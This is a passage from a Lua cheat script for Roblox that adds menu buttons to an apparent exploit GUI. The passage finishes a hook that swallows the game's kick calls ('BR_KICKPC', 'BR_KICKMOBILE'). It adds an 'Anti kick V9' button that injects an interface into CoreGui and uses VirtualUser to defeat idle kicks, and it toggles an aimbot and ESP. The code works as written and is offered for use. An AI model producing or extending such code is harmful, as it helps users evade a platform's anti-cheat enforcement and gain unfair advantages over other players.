                return
            elseif tostring(args[1]) == "BR_KICKPC" then
                return
            elseif tostring(args[1]) == "BR_KICKMOBILE" then
                return
            end
            return old(self, ...)
        end)
  	end    
}) 
BypassTab:AddButton({
	Name = "Bypass Stopper Anti kick V9",
	Callback = function()
        wait(0.5)local ba=Instance.new("ScreenGui")
        local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
        local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
        ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
        ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
        ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
        ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti Kick V9"ca.TextColor3=Color3.new(0,1,1)
        ca.TextSize=22;da.Parent=ca
        da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
        da.Size=UDim2.new(0,370,0,107)_b.Parent=da
        _b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
        _b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="Feito por Larissa da Phx "
        _b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
        ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
        ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
        ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
        game:service'Players'.LocalPlayer.Idled:connect(function()
        bb:CaptureController()bb:ClickButton2(Vector2.new())
        ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)
  	end    
})
    ArmaTab:AddToggle({
        Name = "Aimbot + Esp Hub",
        Default = false,
        Callback = function(Value)
            _G.Aimbot = Value
            Aimbot()
        end    
    })    
